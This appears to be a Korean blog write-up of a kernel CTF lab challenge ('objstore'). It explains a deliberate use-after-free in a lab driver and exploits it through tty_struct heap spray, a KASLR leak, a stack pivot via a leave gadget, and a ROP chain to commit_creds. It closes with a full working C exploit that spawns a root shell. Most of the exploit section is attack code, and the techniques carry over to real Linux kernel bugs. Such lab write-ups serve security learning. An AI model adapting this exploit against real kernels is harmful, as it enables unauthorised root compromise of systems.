---
title: "[Kernel Ctf Lab] Objstore"
tags: writeup
toc: true
---


## Introduction

디바이스 드라이버에 1024 바이트 use-after-free가 있을 때 stack pivot으로 루트를 얻을 수 있는지 묻는
문제이다\[1\].

## Vulnerability

주어진 드라이버는 objstore로 objstore\_io와 obj\_entry 구조체를 정의하여
사용한다. 이때 전자는 ioctl 인자 처리로, 후자는 내부 버퍼처럼 쓰인다.

``` c
#define OBJ_SIZE     1024   /* matches kmalloc-1024, same as tty_struct */

struct objstore_io {
    unsigned long idx;
    unsigned long size;
    char __user  *data;
};

/*
 * Object layout — a simple data blob.  The entire 1024 bytes are
 * available to the user.  When a tty_struct lands in the same slot
 * after the UAF, the first 8 bytes overlap with tty->magic and
 * bytes 24-32 overlap with the tty_operations pointer.
 */
struct obj_entry {
    char data[OBJ_SIZE];
};
```

이제 objstore\_ioctl 함수 구현을 보면, 할당 (= CMD\_CREATE), 해제
(= CMD\_DELETE), 읽기 (= CMD\_READ), 쓰기 (=
CMD\_WRITE) 명령어를 처리한다. 할당 명령어로 얻은 메모리 주소는 전역 배열에 기록되는데, 해제 명령어는
이를 NULL로 초기화하지 않는다. 그래서 UAF를 트리거 할 수 있다.

``` c
static struct obj_entry *objects[MAX_OBJECTS];
static DEFINE_MUTEX(store_lock);

static long objstore_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct objstore_io io;
    long ret = 0;

    if (cmd == CMD_DELETE) {
        /*
         * CMD_DELETE takes just an index via arg directly.
         * This keeps the ioctl interface minimal.
         */
        unsigned long idx = arg;
        mutex_lock(&store_lock);
        if (idx >= MAX_OBJECTS || !objects[idx]) {
            mutex_unlock(&store_lock);
            return -ENOENT;
        }
        kfree(objects[idx]);
        /*
         * BUG: pointer NOT set to NULL after free.
         *
         * This is the classic dangling-pointer pattern seen in real
         * kernel drivers (cf. CVE-2021-22555, CVE-2022-2588).
         * The slot still holds the old address, so subsequent
         * CMD_READ / CMD_WRITE access freed memory.
         */
        mutex_unlock(&store_lock);
        return 0;
    }

    if (copy_from_user(&io, (void __user *)arg, sizeof(io)))
        return -EFAULT;

    if (io.idx >= MAX_OBJECTS)
        return -EINVAL;

    mutex_lock(&store_lock);

    switch (cmd) {
    case CMD_CREATE:
        if (objects[io.idx]) {
            ret = -EEXIST;
            break;
        }
        objects[io.idx] = kmalloc(OBJ_SIZE, GFP_KERNEL);
        if (!objects[io.idx]) {
            ret = -ENOMEM;
            break;
        }
        memset(objects[io.idx], 0, OBJ_SIZE);
        break;

    case CMD_READ:
        if (!objects[io.idx]) {
            ret = -ENOENT;
            break;
        }
        if (io.size > OBJ_SIZE)
            io.size = OBJ_SIZE;
        /*
         * If the slot was freed and reclaimed by a tty_struct,
         * this leaks tty_struct contents including the
         * tty_operations pointer → KASLR defeat.
         */
        if (copy_to_user(io.data, objects[io.idx]->data, io.size)) {
            ret = -EFAULT;
            break;
        }
        break;

    case CMD_WRITE:
        if (!objects[io.idx]) {
            ret = -ENOENT;
            break;
        }
        if (io.size > OBJ_SIZE)
            io.size = OBJ_SIZE;
        /*
         * If the slot was freed and reclaimed by a tty_struct,
         * this overwrites tty_struct fields — including the
         * tty_operations function-pointer table. The attacker
         * can redirect any tty operation (e.g. ioctl, write)
         * to a stack-pivot gadget → kernel ROP.
         */
        if (copy_from_user(objects[io.idx]->data, io.data, io.size)) {
            ret = -EFAULT;
            break;
        }
        break;

    default:
        ret = -ENOTTY;
    }

    mutex_unlock(&store_lock);
    return ret;
}
```

## Exploit

Objstore\_ioctl()에서 메모리를 할당하거나 해제할 때 그 크기는 1024 바이트이다. 그래서 1024
바이트 UAF가 가능하고, 이 경우에 타겟 구조체로 tty\_struct가 유용함이 알려져 있다\[2\].

### Heap spray

Tty\_struct 구조체를 spray할 때는 /dev/ptmx를 사용한다. 이 파일을 열 때 이 구조체가
할당되며, 해제된 메모리에 할당되었는지 여부를 확인할 때는 obj\_entry 구조체를 읽어서 커널
주소가 있는지 검사하면 된다. 그 이유는 tty\_struct가 커널 영역의 주소를 갖는 포인터 멤버들을
포함하기 때문이다 (include/linux/tty.h에서 발췌)\[4\].

``` c
struct tty_struct {
  struct kref kref;
  struct device *dev;
  struct tty_driver *driver;
  const struct tty_operations *ops;
  int index;

  struct ld_semaphore ldisc_sem;
  struct tty_ldisc *ldisc;
    /* ... */
}
```

### Bypass KASLR

상기 ptmx 파일을 열어서 할당되는 tty\_struct 구조체의 멤버 중 ops 포인터 변수는
ptm\_unix98ops 전역 변수의 주소를 담고 있다. 따라서 이 포인터 변수값을 읽으면 커널의 시작 주소를
얻을 수 있다.

### Control flow hijacking

상기 ptmx 파일을 descriptor로 하여 호출된 ioctl 시스템 콜은 tty\_ioctl()을 호출한다.
이때 TCFLSH 명령어에 인자로 0을 주면 tty-\>ops-\>ioctl로 넘어간다
(/drivers/tty/tty\_io.c에서 발췌)\[4\].

``` c
long tty_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
  struct tty_struct *tty = file_tty(file);
  struct tty_struct *real_tty;
  void __user *p = (void __user *)arg;
  int retval;
  struct tty_ldisc *ld;

    /* ... */

  /*
   *  Now do the stuff.
   */
  switch (cmd) {
        /* ... */
  case TCFLSH:
      switch (arg) {
      case TCIFLUSH:
      case TCIOFLUSH:
      /* flush tty buffer and allow ldisc to process ioctl */
          tty_buffer_flush(tty, NULL);
          break;
      }
      break;
        /* ... */
  }
  if (tty->ops->ioctl) {
      retval = tty->ops->ioctl(tty, cmd, arg);
      if (retval != -ENOIOCTLCMD)
          return retval;
  }
    /* ... */
  return retval;
}
```

### Stack pivot

상기 tty-\>ops-\>ioctl을 호출하는 시점에서 RBP는 tty\_struct의 시작 주소를 갖는다.
이는 tty-\>ops-\>ioctl에 쓰레기값을 대입한 후에 커널 패닉을 발생시키면 알 수 있다. 그래서 leave
가젯을 통해 stack pivot을 할 수 있고, 최종적으로 다음과 같이 tty\_struct를
구성한다\[2\].

``` text
struct tty_struct {
  +000: kref        : 0x5401
  +008: dev;        : `pop rsp` gadget (return addr of `leave`)
  +010: driver;     : &tty_struct + 0x170 (`pop rsp`ed) (MUST be valid kheap addr)
  +018: ops;        : &tty_struct + 0x50
  +020: index;
  ...
  +050:             : fake vtable (size=0x120)
  ...
  +110:             : tty->ops->ioctl (points to `leave` gadget)
  ...
  +170:             : actual ROP chain
  ...
}
```

위와 같이 구성하기 위해서는 tty\_struct의 시작 주소를 알고 있어야 한다. 이는
tty\_struct의 ldisc\_sem이 초기에는 자기 자신의 주소를 갖는다는 점을 이용하여
얻을 수 있다.

### Ret2usr and exploit code

상기 ROP 체인 (actual ROP chain)은 pop rdi 가젯으로
commit\_creds(prepare\_kernelcred(0))을 하고 kernel page
table isolation (KPTI) trampoline 후에 스택을 사용자 레지스터로
채워주면 된다\[5, 6\].

<br>

지금까지 설명한 것을 C 코드로 작성하면 다음과 같다.

``` c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/ioctl.h>

enum {
    MAX_OBJECTS = 16,
    OBJ_SIZE = 1024
};

#define CMD_CREATE   _IOW('O', 1, struct objstore_io)
#define CMD_READ     _IOR('O', 2, struct objstore_io)
#define CMD_WRITE    _IOW('O', 3, struct objstore_io)
#define CMD_DELETE    _IO('O',  4)

struct objstore_io {
    unsigned long idx;
    unsigned long size;
    char *data;
};

struct tty_structure {
    int kref;
    void *dev;
    void *driver;
    void *ops;
    int index;
};

enum {
    KBASE_NOKASLR = 0xffffffff81000000,
    LDSEM_READ_OFF = 0x38,
};

void die(const char *funcname)
{
    perror(funcname);
    exit(-1);
}

void printtty(struct tty_structure *tty)
{
    printf("kref: %d\n", tty->kref);
    printf("dev: %p\n", tty->dev);
    printf("driver: %p\n", tty->driver);
    printf("ops: %p\n", tty->ops);
    printf("index: %d\n", tty->index);
}

void printbytes(uint64_t *buf, size_t len)
{
    size_t i;

    for (i = 0; i < len; i++)
        printf("0x%016lx\n", buf[i]);
}

enum {
    SPRAY_COUNT = 128
};
int fds[SPRAY_COUNT];

int ptmx_spray(int fd, struct objstore_io *arg)
{
    unsigned int i;
    int res;
    struct tty_structure *tty;

    for (i = 0; i < SPRAY_COUNT; i++) {
        fds[i] = open("/dev/ptmx", O_RDWR);
        if (fds[i] == -1)
            die("open");

        res = ioctl(fd, CMD_READ, arg);
        if (res == -1)
            die("ioctl");

        tty = (struct tty_structure *) arg->data;
        if (((uint64_t) tty->ops & 0xffffffff00000000) == 0xffffffff00000000) {
            printf("[*] fd: %d\n", fds[i]);
            return fds[i];
        }
    }
}

void ptmxes_close(void)
{
    unsigned int i;

    for (i = 0; i < SPRAY_COUNT; i++)
        close(fds[i]);
}

void start_sh()
{
    char *args[] = {"/bin/sh", "-i", NULL};

    execve("/bin/sh", args, NULL);
}

unsigned long u_cs;
unsigned long u_ss;
unsigned long u_rsp;
unsigned long u_rflags;
unsigned long u_rip;

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov u_cs, cs;"
        "mov u_ss, ss;"
        "mov u_rsp, rsp;"
        "pushf;"
        "pop u_rflags;"
        ".att_syntax;"
        );
    u_rip = (unsigned long) &start_sh;
}

void ret2usr_tty_struct(uint64_t *buf, uint64_t ttybase, uint64_t kbase)
{
    struct tty_structure *tty;
    uint64_t bufptr;
    uint64_t leave = kbase + (0xffffffff810fe715 - KBASE_NOKASLR);
    uint64_t pop_rsp = kbase + (0xffffffff8102b3c8 - KBASE_NOKASLR);
    uint64_t pop_rdi = kbase + (0xffffffff810fb12f - KBASE_NOKASLR);
    uint64_t prepare_kernel_cred = kbase + (0xffffffff8109abb0
                                            - KBASE_NOKASLR);
    uint64_t commit_creds = kbase + (0xffffffff8109a910 - KBASE_NOKASLR);
    uint64_t kpti_trampoline = kbase + (0xffffffff81e00f41 - KBASE_NOKASLR);

    save_state();

    tty = (struct tty_structure *) buf;
    tty->ops = ttybase + 0x50;
    bufptr = (uint64_t) buf;
    bufptr += 0x50;             /* ops */
    bufptr += 96;               /* ops->ioctl */
    *((uint64_t *) bufptr) = leave; /* leave; ret */
    tty->dev = pop_rsp;               /* pop rsp; ret */
    tty->driver = ttybase + 0x170;
    bufptr = (uint64_t) buf;
    bufptr += 0x170;
    *((uint64_t *) bufptr) = pop_rdi; /* pop rdi; ret */
    bufptr += 0x8;
    *((uint64_t *) bufptr) = 0x0000000000000000;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = prepare_kernel_cred; /* prepare_kernel_cred */
    bufptr += 0x8;
    *((uint64_t *) bufptr) = commit_creds; /* commit_cred */
    bufptr += 0x8;
    *((uint64_t *) bufptr) = kpti_trampoline; /* KPTI trampoline */
    bufptr += 0x8;
    *((uint64_t *) bufptr) = 0x0000000000000000;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = 0x0000000000000000;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = u_rip;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = u_cs;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = u_rflags;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = u_rsp;
    bufptr += 0x8;
    *((uint64_t *) bufptr) = u_ss;
}

int main(int argc, char *argv[])
{
    int fd, ptmx_fd, res, idx;
    struct objstore_io arg;
    struct tty_structure *tty;
    uint8_t buf[BUFSIZ] = { 0x41, };
    uint64_t kbase, ttybase;

    fd = open("/dev/objstore", O_RDWR);
    if (fd == -1)
        die("open");

    arg.idx = 0;
    if (argc == 2)
        arg.idx = atoi(argv[1]);
    printf("[*] idx: %ld\n", arg.idx);
    arg.size = OBJ_SIZE;
    arg.data = buf;
    res = ioctl(fd, CMD_CREATE, &arg);
    if (res == -1)
        die("ioctl");
    puts("[+] obj_entry allocated");

    idx = arg.idx;
    printf("[*] idx: %d\n", idx);
    res = ioctl(fd, CMD_DELETE, idx);
    if (res == -1)
        die("ioctl");

    ptmx_fd = ptmx_spray(fd, &arg);
    puts("[+] Ptmx sprayed");

    res = ioctl(fd, CMD_READ, &arg);
    if (res == -1)
        die("ioctl");

    tty = (struct tty_structure *) buf;
    kbase = (uint64_t) tty->ops - (0xffffffff82281b00 - KBASE_NOKASLR);
    printf("[*] Kernel base: %p\n", (void *) kbase);

    /* printbytes((uint64_t *) buf, OBJ_SIZE >> 3); */
    ttybase = *((uint64_t *) buf + (LDSEM_READ_OFF >> 3));
    ttybase -= LDSEM_READ_OFF;
    printf("[*] TTY base: %lx\n", ttybase);

    ret2usr_tty_struct((uint64_t *) buf, ttybase, kbase);
    res = ioctl(fd, CMD_WRITE, &arg);
    if (res == -1)
        die("ioctl");
    puts("[+] Data written");

    /* tty->ops->ioctl is 0xffffffff845561f0 */
    res = ioctl(ptmx_fd, TCFLSH, 0);
    if (res == -1)
        die("ioctl");

    ptmxes_close();
    return 0;
}
```

## References

1.  0xCD4, "kernel-ctf-lab." github.com, Accessed: Apr. 27, 2026.
    \[Online\]. Available: <https://github.com/0xCD4/kernel-ctf-lab>
2.  smallkirby, "tty\_struct." github.com, Accessed: Apr. 27,
    2026. \[Online\]. Available:
    <https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md>
3.  ptr-yudai, "Holestein v3: Use-after-Freeの悪用." pawnyable.cafe,
    Accessed: Apr. 27, 2026. \[Online\]. Available:
    <https://pawnyable.cafe/linux-kernel/LK01/use_after_free.html>
4.  Linus Torvalds et al., "Linux kernel", (Version 6.1.75) \[Source
    Code\]. <https://github.com/torvalds/linux>
5.  ssongk, "\[hxpCTF 2020\] kernel-rop (with write-up) (2)."
    ssongkit.tistory.com, Accessed: Apr. 27, 2026. \[Online\].
    Available: <https://ssongkit.tistory.com/821>
6.  "Linux Kernel Exploitation - ret2usr." scoding.de, Accessed: Apr.
    27, 2026. \[Online\]. Available:
    <https://scoding.de/linux-kernel-exploitation-buffer_overflow>
